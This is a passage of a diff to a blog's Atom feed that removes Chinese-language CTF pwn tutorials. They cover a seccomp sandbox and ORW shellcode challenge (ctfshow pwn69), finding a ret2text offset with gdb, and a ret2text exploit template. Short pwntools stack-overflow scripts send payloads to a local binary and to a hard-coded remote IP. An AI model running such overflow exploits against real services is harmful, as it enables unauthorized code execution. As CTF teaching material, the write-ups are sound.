-    <content type="html"><![CDATA[<p>这一块的题难度上升的有点快，已经涉及到基本的汇编知识了，并且明显看出来在为接下来的ret2syscall做铺垫，exp也是不好理解，接下来进行详细的讲解</p><h1 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h1><p>seccomp函数，它会阻止进程的一部分系统调用，比如我们的execve，这种情况下我们无法直接拿到shell，只能去通过orw，即open-read-write去读出flag文件</p><blockquote><p>seccomp-tools dump .&#x2F;pwn</p></blockquote><p>我们可以通过上述指令查看允许的系统调用</p><h1 id="pwntools的前置语法基础"><a href="#pwntools的前置语法基础" class="headerlink" title="pwntools的前置语法基础"></a>pwntools的前置语法基础</h1><p>我们需要一些pwntools的语法，不过这并不算难</p><blockquote><p>asm(code, vma&#x3D;0, extract&#x3D;True, arch&#x3D;None, os&#x3D;None)</p></blockquote><p>后面三个不用管，我们重点看前两个</p><p>code是必填的，它包含汇编指令的字符串<br>vms是虚拟内存地址，是指定代码被编译时所处的起始地址</p><blockquote><p>asm(shellcraft.你要调用的函数)</p></blockquote><p>shellcraft不仅可以帮助我们生成shellcode的汇编，还可以帮我们生成某个函数的汇编代码，这样就不需要我们自己生成了</p><p>如果我们需要写连续的汇编指令，可以用分分号连接</p><h1 id="eg：ctfshow-pwn69"><a href="#eg：ctfshow-pwn69" class="headerlink" title="eg：ctfshow pwn69"></a>eg：ctfshow pwn69</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(int a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  mmap((void *)0x123000, 0x1000uLL, 6, 34, -1, 0LL);</span><br><span class="line">  sub_400949();</span><br><span class="line">  sub_400906();</span><br><span class="line">  sub_400A16();</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 sub_400949()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v1 = seccomp_init(0LL);</span><br><span class="line">  seccomp_rule_add(v1, 2147418112LL, 0LL, 0LL);</span><br><span class="line">  seccomp_rule_add(v1, 2147418112LL, 1LL, 0LL);</span><br><span class="line">  seccomp_rule_add(v1, 2147418112LL, 2LL, 0LL);</span><br><span class="line">  seccomp_rule_add(v1, 2147418112LL, 60LL, 0LL);</span><br><span class="line">  return seccomp_load(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void sub_400906()</span><br><span class="line">&#123;</span><br><span class="line">  setbuf(stdin, 0LL);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  setbuf(stderr, 0LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int sub_400A16()</span><br><span class="line">&#123;</span><br><span class="line">  char buf[32]; // [rsp+0h] [rbp-20h] BYREF</span><br><span class="line"></span><br><span class="line">  puts(&quot;Now you can use ORW to do&quot;);</span><br><span class="line">  read(0, buf, 0x38uLL);</span><br><span class="line">  return puts(&quot;No you don&#x27;t understand I say!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个函数里存在沙箱，第三个函数里给了我们栈溢出的地方</p><p>一般来说遇到read函数我们就要注意了，因为它通常会限制我们溢出的长度，本题就是只给了我们0x38的余地，这显然是不够的，但是我们注意到main函数里存在mmap函数，可以放到0x123000处</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-24_16-58-55.4xuz6rej1q.png"></p><p>沙箱只允许我们进行orw这三个函数的系统调用</p><p>我一开始的思路和ret2syscall一样，打算先找寄存器的gadget，但是用ROPgadget尝试找了gadget发现是找不到的，所以这个题主要利用的不全是ROP技术，我们是直接在mmap分配的内存里直接写入汇编指令的，不需要费劲一个个跳转了</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-24_21-17-26.wizsmiucs.png"></p><p>我们不会用pop rsp，而是jmp rsp</p><blockquote><p>0x0000000000400a01 : jmp rsp</p></blockquote>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;这一块的题难度上升的有点快，已经涉及到基本的汇编知识了，并且明显看出来在为接下来的ret2syscall做铺垫，exp也是不好理解，接下来进行详细的讲解&lt;/p&gt;
-&lt;h1 id=&quot;沙箱&quot;&gt;&lt;a href=&quot;#沙箱&quot; class=&quot;headerlink&quot; title=&quot;沙箱&quot;&gt;</summary>
-      
-    
-    
-    
-    <category term="pwn入门" scheme="https://jiutian521.github.io/categories/pwn%E5%85%A5%E9%97%A8/"/>
-    
-    
-    <category term="ret2shellcode" scheme="https://jiutian521.github.io/tags/ret2shellcode/"/>
+    <category term="gdb" scheme="https://jiutian521.github.io/tags/gdb/"/>
     
   </entry>
   
@@ -456,57 +512,6 @@
     
     
     <category term="ret2shellcode" scheme="https://jiutian521.github.io/tags/ret2shellcode/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>用gdb的动态视角看ret2text的实现</title>
-    <link href="https://jiutian521.github.io/posts/2ee84d32.html"/>
-    <id>https://jiutian521.github.io/posts/2ee84d32.html</id>
-    <published>2025-10-27T10:18:00.000Z</published>
-    <updated>2025-11-06T00:09:33.225Z</updated>
-    
-    <content type="html"><![CDATA[<p>来看一道非常简单的栈溢出</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b4fae7ce4b.png" alt="Snipaste_2025-11-05_21-22-13.png"></p><p>后门函数地址ida里很明显，0x8048521</p><p>exp本身不难写,下面看一下怎么用gdb确定偏移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">io=process(&quot;./pwn&quot;)</span><br><span class="line">#io=remote(&quot;pwn.challenge.ctf.show&quot;,28175);</span><br><span class="line">gdb.attach(io,&quot;b main&quot;) #在main函数下断点</span><br><span class="line">payload=b&quot;A&quot;*(0x12+0x4)+p32(0x8048521)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b52df75180.png" alt="Snipaste_2025-11-05_21-36-52.png"></p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b533859667.png" alt="Snipaste_2025-11-05_21-37-43.png"></p><p>0xffffcfd8 是当前函数的栈底，指向的0xffffcfe8是上一个函数的栈底（old_ebp）</p><p>用0xffffcfd8减去0xffffcfc6得到0x12，这也就对上了ida里的偏移量</p><p>我们退出，输入fini直接运行完，可以看出已经覆盖了0x12+0x4个字节，并且我们的后门函数地址已经成功覆盖到了ebp下的返回地址</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b53386ffa9.png" alt="Snipaste_2025-11-05_21-37-58.png"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;来看一道非常简单的栈溢出&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://youke1.picui.cn/s1/2025/11/05/690b4fae7ce4b.png&quot; alt=&quot;Snipaste_2025-11-05_21-22-13.png&quot;&gt;&lt;/p&gt;
-&lt;p&gt;后门函</summary>
-      
-    
-    
-    
-    <category term="pwn入门" scheme="https://jiutian521.github.io/categories/pwn%E5%85%A5%E9%97%A8/"/>
-    
-    
-    <category term="ret2text" scheme="https://jiutian521.github.io/tags/ret2text/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ret2text小tips</title>
-    <link href="https://jiutian521.github.io/posts/1111.html"/>
-    <id>https://jiutian521.github.io/posts/1111.html</id>
-    <published>2025-10-24T04:00:00.000Z</published>
-    <updated>2025-11-06T00:08:18.351Z</updated>
-    
-    <content type="html"><![CDATA[<p>exp模板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = remote(&quot;39.106.48.123&quot;, 29826)</span><br><span class="line"></span><br><span class="line">payload = b&quot;A&quot;*264 + p64(0x401202)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>264即258+8，258是rbp的位置，ida里一般是16位，0x401202为后门函数入栈的地址</p><p>注意：1.一定不要忘记加4&#x2F;8个字节覆盖栈底寄存器 2.在64位程序中，如果不成功，可能是栈没有对齐，需要把后门函数的地址往后加两个单位</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;exp模板&lt;/p&gt;
-&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/spa</summary>
-      
-    
-    
-    
-    <category term="pwn入门" scheme="https://jiutian521.github.io/categories/pwn%E5%85%A5%E9%97%A8/"/>
-    
-    
-    <category term="ret2text" scheme="https://jiutian521.github.io/tags/ret2text/"/>
     
   </entry>
   
